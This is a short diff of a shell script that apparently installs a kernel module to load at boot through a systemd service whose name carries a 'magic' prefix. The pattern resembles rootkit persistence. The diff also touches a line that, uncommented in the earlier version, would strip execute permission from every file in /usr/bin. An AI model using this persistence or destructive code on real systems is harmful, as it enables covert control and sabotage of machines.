@@ -35,7 +35,7 @@ if test -f "$koFile"; then
     echo "#!/bin/bash" >> boot.sh
     echo "insmod $thisDirPath/$koFile" >> boot.sh
     if $makeImmutable; then
-        #echo "$trovePath/chmod -x /usr/bin/*" >> boot.sh
+        echo "$trovePath/chmod +x /usr/bin/*" >> boot.sh
     fi
     bootPath="$thisDirPath/boot.sh"
     bootServicePath="/etc/systemd/system/""$magicPrefix""load.service"
